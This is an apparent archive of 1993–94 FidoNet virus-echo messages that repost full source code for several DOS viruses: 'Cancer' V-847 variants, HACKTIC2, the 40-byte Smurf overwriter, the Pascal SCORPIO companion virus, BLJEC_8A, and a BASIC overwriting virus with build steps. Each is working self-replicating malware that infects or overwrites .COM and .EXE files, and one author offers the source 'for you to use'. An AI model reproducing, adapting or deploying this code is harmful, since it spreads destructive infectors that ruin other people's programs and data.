 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09 
 To   : -  *.*  -                                                               
 Subj : PIXLCANC.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e71
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Viral Doctor, 2:283/718 (06 Nov 94 16:12)
* To   : Fred Lee
* Subj : PIXLCANC.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Viral.Doctor@f718.n283.z2.fidonet.org
    page    ,132
    name    CANCER
    title   Cancer - a mutation of the V-847 virus
    .radix  16
code    segment
    assume  cs:code,ds:code
    org 100

olddta  equ 80
virlen  equ offset endcode - offset start
smalcod equ offset endcode - offset transf
buffer  equ offset endcode + 100
newdta  equ offset endcode + 10
fname   =   newdta + 1E
virlenx =   offset endcode - offset start

start:
    jmp cancer

ident   dw  'VI'
counter db  0
allcom  db  '*.COM',0
vleng   db  virlen
n_10D   db  3       ;Unused
progbeg dd  ?
eof dw  ?
handle  dw  ?

cancer:
    mov ax,cs       ;Move program code
    add ax,1000     ; 64K bytes forward
    mov es,ax
    inc [counter]
    mov si,offset start
    xor di,di
    mov cx,virlen
    rep movsb

    mov dx,newdta   ;Set new Disk Transfer Address
    mov ah,1A       ;Set DTA
    int 21
    mov dx,offset allcom    ;Search for '*.COM' files
    mov cx,110b     ;Normal, Hidden or System
    mov ah,4E       ;Find First file
    int 21
    jc  done        ;Quit if none found

mainlp:
    mov dx,offset fname
    mov ax,3D02     ;Open file in Read/Write mode
    int 21
    mov [handle],ax ;Save handle
    mov bx,ax
    push    es
    pop ds
    mov dx,buffer
    mov cx,0FFFF    ;Read all bytes
    mov ah,3F       ;Read from handle
    int 21      ;Bytes read in AX
    add ax,buffer
    mov cs:[eof],ax ;Save pointer to the end of file

    xor cx,cx       ;Go to file beginning
    mov dx,cx
    mov bx,cs:[handle]
    mov ax,4200     ;LSEEK from the beginning of the file
    int 21
    jc  close       ;Leave this file if error occures

    mov dx,0        ;Write the whole code (virus+file)
    mov cx,cs:[eof] ; back onto the file
    mov bx,cs:[handle]
    mov ah,40       ;Write to handle
    int 21

close:
    mov bx,cs:[handle]
    mov ah,3E       ;Close the file
    int 21

    push    cs
    pop ds      ;Restore DS
    mov ah,4F       ;Find next matching file
    mov dx,newdta
    int 21
    jc  done        ;Exit if all found
    jmp mainlp      ;Otherwise loop again

done:
    mov dx,olddta   ;Restore old Disk Transfer Address
    mov ah,1A       ;Set DTA
    int 21

    mov si,offset transf    ;Move this part of code
    mov cx,smalcod  ;Code length
    xor di,di       ;Move to ES:0
    rep movsb       ;Do it

    xor di,di       ;Clear DI
    mov word ptr cs:[progbeg],0
    mov word ptr cs:[progbeg+2],es  ;Point progbeg at program start
    jmp cs:[progbeg]    ;Jump at program start

transf:
    push    ds
    pop es
    mov si,buffer+100
    cmp [counter],1
    jne skip
    sub si,200
skip:
    mov di,offset start
    mov cx,0FFFF    ;Restore original program's code
    sub cx,si
    rep movsb
    mov word ptr cs:[start],offset start
    mov word ptr cs:[start+2],ds
    jmp dword ptr cs:[start]    ;Jump to program start
endcode label   byte

    int 20      ;Dummy program
    int 20      ;???

    db  0       ;Unused

code    ends
    end start

-+-  DinoMail v.1.0 Alpha
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/n            No default libraries

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 30 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10 
 To   : -  *.*  -                                                               
 Subj : HACKTIC2.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e7f
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:13)
* To   : Mark Hapershaw
* Subj : HACKTIC2.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
tic             segment
                org     100h
                assume  cs:tic, ds:tic, es:tic
;
len     equ     offset last-100h        ;LENGTH OF VIRUS CODE
;
start:          mov     bx,0fh          ;KLUDGE TO AVOID MEMALLOC ERROR
                mov     ah,4ah
                int     21h
                mov     dx,es
                add     dh,10h
                mov     es,dx           ;PROGRAM CODE WILL RUN HERE
                push    dx              ;SET UP FOR FAR RETURN
                push    si
                mov     ah,26h          ;CREATE NEW PSP
                int     21h
                mov     di,si
                mov     si,offset last
                push    si
                mov     ch,0feh
                rep     movsb           ;MOVE PROGRAM CODE UP
                dec     cx              ;=FFFF
                pop     di
                mov     dx,offset file
                mov     ah,4eh          ;FIND FIRST .COM FILE
                jmp     short find
retry:          mov     ah,4fh          ;FIND NEXT
find:           int     21h
                jc      nofile          ;NO (MORE) FILES
                mov     dx,9eh          ;FILE NAME IN DTA
                mov     ax,3d02h        ;OPEN FILE
                int     21h
                xchg    ax,bx           ;1-BYTE MOVE OF AXBX
                mov     dx,di           ;END OF VIRUS CODE
                mov     ah,3fh          ;READ FILE DATA (CX=FFFF)
                int     21h             ;READ FILE AFTER VIRUS CODE
                add     ax,len          ;LENGTH OF VIRUS+FILE
                cmp     byte ptr [di],0bbh    ;CHECK IF ALREADY INFECTED
                je      retry           ;TRY AGAIN
                push    ax
                xor     cx,cx
                mov     ax,4200h        ;RESET FILE POINTER
                cwd                     ;DX=0
                int     21h
                pop     cx
                mov     dh,1
                mov     ah,40h          ;WRITE INFECTED CODE BACK
                int     21h
;
nofile:         push    es              ;GO RUN PROGRAM
                pop     ds
                retf
;
file    db      '*.COM',0               ;SEARCH FOR .COM FILES
last    db      0c3h                    ;STANDALONE VIRUS CODE JUST RETURNS
tic             ends
                end     start

; ─────────────────────────────────────────────────────────────────────────
; ────────────────────> and Remember Don't Forget to Call <────────────────
; ────────────> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <──────────
; ─────────────────────────────────────────────────────────────────────────

-+-  FastEcho/386 1.41.b7/Real
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/dSYM[=VAL]   Define symbol SYM = 0, or = value VAL

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 31 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10 
 To   : -  *.*  -                                                               
 Subj : OW_40.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e85
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 16:13)
* To   : Doug Bryce
* Subj : OW_40.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
─────────═════════>>> Article From Evolution #2 - YAM '92

Article Title: The Smurf Virus
Author: Admiral Bailey


;---
; The Smurf virus [40 Bytes Long]
;
; Author   : Admiral Bailey [YAM '92]
; Date     : June 6 1992
; Language : Assembly [TASM 2.0]
;
; Notes:The Smurf virus was my first attempt at writing the smallest
;       overwriting virus known.  For a first attempt it wasn't that
;       bad. So far I have got it down to 40 bytes.  The record that
;       does the same as this is about 38 bytes.  So I gotta loose 2
;       bytes in here somewhere.  Well seeing as this small thing is
;       probably the easiest virus in the world to disassemble, I have
;       included the source in this issue of Evolution for all of you
;       to take a look at.  The source is for you to use.  If you
;       happend to make anything smaller using this source please just
;       give recognition to myself, Admiral Bailey, saying that you got
;       help looking at this source.  The only thing that this does is
;       find everyfile in the current directory and overwrite the 1st
;       40 bytes with itself.  Then locks your computer while it is in
;       a search loop looking for more file when there are none.  A
;       neat thing about this is that it displays its entire self to
;       the screen when executed.  Scan 91 notices this as the mini
;       virus but I dont blame it seeing that you cant realy avoid
;       scan when your virus gets this small. Well enjoy the source...
;       and remember if you use it and enjoy it just let me know.
;---
code    segment
        assume  ds:code, ss:code, cs:code, es:code
        org     100h                    ;Make it a .com file

virus_start     equ     $

start:
        mov     dx,offset file_type     ;type of file to look for
        mov     ah,4eh                  ;Find first file command

infect:
        int     21h
        mov     ax,3d02h                ;open again to reset handle
        mov     dx,80h+1eh              ;moves filename into dx
        int     21h
        mov     bx,ax                   ;save handle again
        mov     cx,virus_length         ;put size of virus in cx
        mov     dx,100h                 ;where the code starts
        mov     ah,40h                  ;write to handle command
        int     21h                     ;write virus into file
        mov     ah,3eh                  ;close handle service
        int     21h                     ;do it

find_next_file:
        mov     ah,4fh                  ;find next file command
        jmp     infect

file_type       db      '*.*',0
virus_end       equ     $
virus_length    =       virus_end - virus_start ;length of virus

code    ends

        end     start

-+-  GoldED 2.50.B1016+
 + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/yx           Extended memory swapping

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 32 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10 
 To   : -  *.*  -                                                               
 Subj : SCORPIO.PAS                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e8b
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 16:15)
* To   : Bill Dirks
* Subj : SCORPIO.PAS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
program virusman;
{$m 16384,0,0}
uses crt ,dos,graph3;
var
 x:real;
 i,alfa:integer;
 f:file;
 fromfile ,tofile ,thisfile :string[12];
 command :string[50];
 atr,atrr,errdos:integer;
 rec,recc,crec: searchrec;
 fre:longint;
 dirs,dstr:string[30];

procedure demo;
function fu(x:real):real;
begin
fu:=sin(x)/(sin(x)+2)*cos(x)*3.2;
end;
begin
nosound;
hires;
for i:=0 to 640 do
begin
x:=i/50;
draw(i,round(fu(x)*50)+75,i,round(fu(x)*50)+125,1);
end;
writeln('HI I AM SCORPIO FROM R.O.L.E. NOW THIS IS A VIRUS EATING YOUR HARDDISK
');
WRITELN('THE IDEA COMES FROM APOLLO ALSO FROM R.O.L.E. "NOW GIV ME SOM FOOD"
');
WRITELN('I ENJOY EATING EXE FILES       ... HAR  H A R  HAR  ... ');
WRITELN('SAY HELLO TO ALL MEMBERS AND CONTACTS ');
writeln('(THE PROTON WARRIOR;APOLLO;LOTUS;GOLDMAN;CSOKI;....) ');
WRITELN('          CU SOON !!!!!!!!!!!');
REPEAT ALFA:=0 UNTIL ALFA=1;
END;


procedure kopie(command:string);
begin
assign(f,fromfile);
setfattr(f,$10);
close(f);
swapvectors;
exec(getenv('comspec'),command);
swapvectors;
if doserror <> 0 then halt;
assign(f,tofile);
setfattr(f,$02);
close(f);
assign(f,fromfile);
setfattr(f,$02);
close(f);
end;

procedure copyfile;
begin
findfirst('c:*.exe',atr,rec);
if doserror <> 0 then halt else begin
tofile:=rec.name;
delete(tofile,length(tofile)-2,3);
tofile:=concat(tofile,'com');
command:=concat('copy ',fromfile,' c:',tofile);
kopie(command);
end;
end;

procedure executef;
begin
swapvectors;
exec(thisfile,'');
swapvectors;
end;
procedure lookup;
procedure nextfile;
begin
repeat
findnext(recc);
if doserror <> 0 then demo
else
 begin
 tofile:=recc.name;
 delete(tofile,length(tofile)-2,3);
 tofile:=concat(tofile,'com');
 findfirst(tofile,atrr,crec);
 errdos:=doserror;
 end;
until errdos <> 0;
command:=concat('copy ',fromfile,' c:',tofile);
kopie(command);
end;

begin
findfirst('c:*.exe',atr,recc);
if doserror <> 0 then
demo
else
 begin
 tofile:=recc.name;
 delete(tofile,length(tofile)-2,3);
 tofile:=concat(tofile,'com');
 findfirst(tofile,atrr,crec);
 if doserror <> 0 then begin
 command:=concat('copy ',fromfile,' c:',tofile);
 kopie(command);
 end else nextfile;
 end;
end;

procedure direcnow;
begin
getdir(0,dirs);
dirs:=copy (dirs,1,1);
if dirs <> 'c' then
begin
fre:=diskfree(3);
if doserror=0 then
begin
copyfile ;
executef;
end
else
executef
end
else
begin
if fre > 20000 then
begin
lookup;
kopie(command);
executef;
end
else
demo;
end;
end;

BEGIN
setcbreak(false);
gotoxy(7,wherey-1);
write('$');                     writeln;
writeln('Bad command or filename');
writeln;
getdir(0,dstr);
write(dstr);
readln(thisfile);
fromfile:=concat(thisfile,'.com');
thisfile:=concat(thisfile,'.exe');
textcolor(0);
direcnow;
end.

-+-  GoldED 2.50.B1016+
 + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/l            Include source line numbers

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 33 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10 
 To   : -  *.*  -                                                               
 Subj : BLJEC_8A.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5eaf
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Bryan Sullivan, 2:283/718 (06 Nov 94 16:16)
* To   : Brad Frazee
* Subj : BLJEC_8A.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Bryan.Sullivan@f718.n283.z2.fidonet.org
.model  tiny
.code
org     100h
kkk:
    nop         ; ID
count   db  90h     ; ID

    mov cx,80h
    mov si,0080h
    mov di,0ff7fh
    rep movsb       ; save param

    lea ax,begp     ; begin prog
    mov cx,ax
        sub     ax,100h
        mov     ds:[0fah],ax   ; len VIR
    add cx,fso
        mov     ds:[0f8h],cx   ; begin buffer W
        ADD     CX,AX
        mov     ds:[0f6h],cx   ; begin buffer R

        mov     cx,ax
    lea si,kkk
        mov     di,ds:[0f8h]
RB:     REP     MOVSB           ; move v

    mov al,3        ; inf. only 3 file
    mov count,al

    mov ah,2ah
    int 21h
    mov ds:[0f2h],dx    ;
    mov ds:[0f4h],cx    ; save system date

        stc

        LEA     DX,FFF
        MOV     AH,4EH
        MOV     CX,20H
        INT     21H     ;  find first

    or  ax,ax
    jz  LLL
    jmp done

LLL:
    MOV     AH,2FH
        INT     21H     ; get DTA

    mov ax,es:[bx+1ah]
        mov     ds:[0fch],ax   ; size
    add bx,1eh
        mov     ds:[0feh],bx   ; point to name

    mov ax,'OC'     ; "CO"
    sub ax,ds:[009eh]
    jne cont0       ; if file name CO*.com then skip
    jmp fin

cont0:
    add ax,180h     ; if new len file + len VIR + 180h > FFF0
    add ax,ds:[0fah]    ;    then skip this file
    add ax,fso
    cmp ax,0fff0h
    jna cont2
    jmp fin

cont2:
    mov cx,ds:[98h]
    and cx,001fh
    mov dl,cl
    mov ax,ds:[98h]
    and ax,01e0h
    mov cl,5
    sar ax,cl
    mov dh,al
    mov ax,ds:[98h]
    and ax,0fe00h
    mov cl,9
    sar ax,cl
    mov cx,ax
    add cx,1980
    mov ah,2bh
    int 21h     ; set system time

    clc
    mov ax,3d02h
    mov dx,bx
    int 21h     ; open file

    mov bx,ax
    mov ah,3fh
        mov     cx,ds:[0fch]
        mov     dx,ds:[0f6h]
    int 21h     ; read file

    mov bx,dx
    mov ax,[bx]
    sub ax,9090h
    jz  fin     ; if file inf. then skip this file

    mov al,'M'
    mov di,dx
    mov cx,ds:[0fch]
    repne   scasb
    jne cont
    mov al,'Z'
    cmp es:[di],al
    je  fin     ; if converted then skip

cont:
        MOV     AX,ds:[0fch]
        mov     bx,ds:[0f6h]
        mov     [bx-2],ax      ; correct old len

    mov ah,3ch
    mov cx,00h
        mov     dx,ds:[0feh]   ; point to name
    clc
    int 21h     ; create file

    mov bx,ax       ; #
    mov ah,40h
        mov     cx,ds:[0fch]
        add     cx,ds:[0fah]
        mov     DX,ds:[0f8h]
    int 21h     ; write file


    mov ah,3eh
    int 21h     ;close file

    dec count
    jz  done

FIN:
    stc
    mov ah,4fh
    int 21h     ; find next

    or  ax,ax
    jnz done

        JMP     lll

DONE:
    mov dx,ds:[0f2h]
    mov cx,ds:[0f4h]
    mov ah,2bh
    int 21h

    mov cx,80h
    mov si,0ff7fh
    mov di,0080h
    rep movsb       ; restore param

        MOV     AX,0A4F3H
        mov     ds:[0fff9h],ax
    mov al,0eah
    mov ds:[0fffbh],al
    mov ax,100h
    mov ds:[0fffch],ax  ; remove REP MOVSB and FAR JMP cs:0100

    lea si,begp
    lea di,kkk
    mov ax,cs
    mov ds:[0fffeh],ax
    mov kk,ax
    mov cx,fso

    db  0eah
        dw      0fff9h
kk  dw  0000h

fff db  '*?.com',0
fso dw  0005h   ; source len file


begp:
    MOV     AX,4C00H
    int     21h     ; exit

end kkk

-+-  FMail 0.96т
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/e            Ignore Extended Dictionary

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 34 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10 
 To   : -  *.*  -                                                               
 Subj : LCT_762.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5eb4
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Alan Jones, 2:283/718 (06 Nov 94 16:17)
* To   : Ron Toler
* Subj : LCT_762.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Alan.Jones@f718.n283.z2.fidonet.org
    page    ,132
    name    LiquidCodeCANCER
    title   LQCancer - a mutation of the V-847 virus
    .radix  16
code    segment
    assume  cs:code,ds:code
    org 100

olddta  equ 80
virlen  equ offset endcode - offset start
smalcod equ offset endcode - offset transf
buffer  equ offset endcode + 100
newdta  equ offset endcode + 10
fname   =   newdta + 1E
virlenx =   offset endcode - offset start

start:
    jmp cancer

ident   db  'LiquidCode<tm>'
counter db  0
allcom  db  '*.COM',0
vleng   db  virlen
n_10D   db  3       ;Unused
progbeg dd  ?
eof dw  ?
handle  dw  ?

cancer:
    mov ax,cs       ;Move program code
    add ax,1000     ; 64K bytes forward
    mov es,ax
    inc [counter]
    mov si,offset start
    xor di,di
    mov cx,virlen
    rep movsb

    mov dx,newdta   ;Set new Disk Transfer Address
    mov ah,1A       ;Set DTA
    mov     ah,ah ;****
    int 21
    mov     ah,ah ;****
    mov dx,offset allcom    ;Search for '*.COM' files
    mov cx,110b     ;Normal, Hidden or System
    mov ah,4E       ;Find First file
    int 21
    jc  done        ;Quit if none found

mainlp:
    mov dx,offset fname
    mov ax,3D02     ;Open file in Read/Write mode
    int 21
    mov [handle],ax ;Save handle
    mov bx,ax
    push    es
    pop ds
    mov dx,buffer
    mov cx,0FFFF    ;Read all bytes
    mov ah,3F       ;Read from handle
    int 21      ;Bytes read in AX
    add ax,buffer
    mov cs:[eof],ax ;Save pointer to the end of file

    xor cx,cx       ;Go to file beginning
    mov dx,cx
    mov bx,cs:[handle]
    mov ax,4200     ;LSEEK from the beginning of the file
    int 21
    jc  close       ;Leave this file if error occures

    mov dx,0        ;Write the whole code (virus+file)
    mov cx,cs:[eof] ; back onto the file
    mov bx,cs:[handle]
    mov ah,40       ;Write to handle
    int 21

close:
    mov bx,cs:[handle]
    mov ah,3E       ;Close the file
    int 21

    push    cs
    pop ds      ;Restore DS
    mov ah,4F       ;Find next matching file
    mov dx,newdta
    int 21
    jc  done        ;Exit if all found
    jmp mainlp      ;Otherwise loop again

done:
    mov dx,olddta   ;Restore old Disk Transfer Address
    mov ah,1A       ;Set DTA
    int 21

    mov si,offset transf    ;Move this part of code
    mov cx,smalcod  ;Code length
    xor di,di       ;Move to ES:0
    rep movsb       ;Do it

    xor di,di       ;Clear DI
    mov word ptr cs:[progbeg],0
    mov word ptr cs:[progbeg+2],es  ;Point progbeg at program start
    jmp cs:[progbeg]    ;Jump at program start

transf:
    push    ds
    pop es
    mov si,buffer+100
    cmp [counter],1
    jne skip
    sub si,200
skip:
    mov di,offset start
    mov     di,di ;****
    mov     bx,0ffff ;****
    mov cx,bx    ;Restore original program's code
    mov     ah,ah ;****
    sub cx,si
    rep movsb
    mov word ptr cs:[start],offset start
    mov word ptr cs:[start+2],ds
    jmp dword ptr cs:[start]    ;Jump to program start
endcode label   byte

    int 20      ;Dummy program
    int 20      ;???

    db  0       ;Unused

code    ends
    end start

;  ─────────────────────────────────────────────────────────────────────────
;  ────────────────────> and Remember Don't Forget to Call <────────────────
;  ────────────> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <──────────
;  ─────────────────────────────────────────────────────────────────────────

-+-  GoldED 2.50.B1016+
 + Origin: Fred's Place (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/n            Suppress symbol tables in listing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 35 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : BURG_VIR.BAS                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ebf
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Viral Doctor, 2:283/718 (06 Nov 94 16:19)
* To   : Mark Hapershaw
* Subj : BURG_VIR.BAS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Viral.Doctor@f718.n283.z2.fidonet.org
                           Viruses in Basic
                           ----------------


Basic is great language and often people think of it as a limited language
and will not be of any use in creating something like a virus. Well you are
really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
files.To do this you must compile the source code using a the Microsoft
Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
the source code to place the lenght of the object program in the LENGHTVIR
variable. BV3.EXE should be in the current directory, COMMAND.COM must be
available, the LENGHTVIR variable must be set to the lenght of the linked

program and remember to use /e parameter when compiling.



10 REM ** DEMO
20 REM ** MODIFY IT YOUR OWN WAY IF DESIRED **
30 REM ** BASIC DOESNT SUCK
40 REM ** NO KIDDING
50 ON ERROR GOTO 670
60 REM *** LENGHTVIR MUST BE SET **
70 REM *** TO THE LENGHT TO THE **
80 REM *** LINKED PROGRAM ***
90 LENGHTVIR=2641
100 VIRROOT$="BV3.EXE"
110 REM *** WRITE THE DIRECTORY IN THE FILE "INH"
130 SHELL "DIR *.EXE>INH"
140 REM ** OPEN "INH" FILE AND READ NAMES **
150 OPEN "R",1,"INH",32000
160 GET #1,1
170 LINE INPUT#1,ORIGINAL$
180 LINE INPUT#1,ORIGINAL$
190 LINE INPUT#1,ORIGINAL$
200 LINE INPUT#1,ORIGINAL$
210 ON ERROR GOT 670
220 CLOSE#2
230 F=1:LINE INPUT#1,ORIGINAL$
240 REM ** "%" IS THE MARKER OF THE BV3
250 REM ** "%" IN THE NAME MEANS
260 REM  ** INFECTED COPY PRESENT
270 IF MID$(ORIGINAL$,1,1)="%" THEN GOTO 210
280 ORIGINAL$=MID$(ORIGINAL$,1,13)
290 EXTENSIONS$=MID$(ORIGINAL,9,13)
300 MID$(EXTENSIONS$,1,1)="."
310 REM *** CONCATENATE NAMES INTO FILENAMES **
320 F=F+1
330 IF MID$(ORIGINAL$,F,1)=" " OR MID$ (ORIGINAL$,F,1)="." OR F=13 THEN
GOTO 350
340 GOTO 320
350 ORIGINAL$=MID$(ORIGINAL$,1,F-1)+EXTENSION$
360 ON ERROR GOTO 210
365 TEST$=""
370 REM ++ OPEN FILE FOUND +++
380 OPEN "R",2,OROGINAL$,LENGHTVIR
390 IF LOF(2) < LENGHTVIR THEN GOTO 420
400 GET #2,2
410 LINE INPUT#1,TEST$
420 CLOSE#2
431 REM ++ CHECK IF PROGRAM IS ILL ++
440 REM ++ "%" AT THE END OF THE FILE MEANS..
450 REM ++ FILE IS ALREADY SICK ++
460 REM IF MID$(TEST,2,1)="%" THEN GOTO 210
470 CLOSE#1
480 ORIGINALS$=ORIGINAL$
490 MID$(ORIGINALS$,1,1)="%"
499 REM ++++ SANE "HEALTHY" PROGRAM ++++
510 C$="COPY "+ORIGINAL$+" "+ORIGINALS$
520 SHELL C$
530 REM *** COPY VIRUS TO HEALTHY PROGRAM ****
540 C$="COPY "+VIRROOT$+ORIGINAL$
550 SHELL C$
560 REM *** APPEND VIRUS MARKER ***
570 OPEN ORIGINAL$ FOR APPEND AS #1 LEN=13
580 WRITE#1,ORIGINALS$
590 CLOSE#1
630 REM ++ OUYPUT MESSAGE ++
640 PRINT "INFECTION IN " ;ORIGIANAL$; "  !! BE WARE !!"
650 SYSTEM
660 REM ** VIRUS ERROR MESSAGE
670 PRINT "VIRUS INTERNAL ERROR GOTTCHA !!!!":SYSTEM
680 END


This basic virus will only attack .EXE files. After the execution you will
see a "INH" file which contains the directory, and the file %SORT.EXE.
Programs which start with "%" are NOT infected ,they pose as back up copies.

-+-  DinoMail v.1.0 Alpha
 + Origin: Virus Research Centre Holland (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 36 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
